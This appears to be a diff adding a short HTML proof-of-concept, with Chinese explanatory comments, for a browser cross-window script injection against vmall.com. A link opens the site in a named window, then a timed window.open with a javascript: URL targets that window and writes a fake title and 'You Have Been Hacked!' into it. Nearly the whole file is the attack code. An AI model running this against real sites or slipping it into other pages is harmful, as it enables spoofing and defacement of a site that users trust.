@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>http://www.vmall.com/</title> <!-- 设置网页标题为 http://www.vmall.com/ -->
+</head>
+<body>
+  <!-- 创建一个链接，点击后会触发 JavaScript 操作 -->
+  <a href="http://www.vmall.com/" target="hacked" onclick="setTimeout('d()', 500);">CLICK</a>
+  <!-- 当点击链接时，`onclick` 事件会触发 `setTimeout` 函数，在 500 毫秒后调用 `d()` 函数 -->
+  
+  <script>
+    function d() {
+      // `d()` 函数在新窗口中打开一个页面，该页面动态生成标题和内容
+      window.open(
+        "javascript:document.write('<title>http://www.vmall.com/</title><h1>You Have Been Hacked!</h1>')",
+        "hacked"
+      );
+    }
+  </script>
+</body>
+</html>
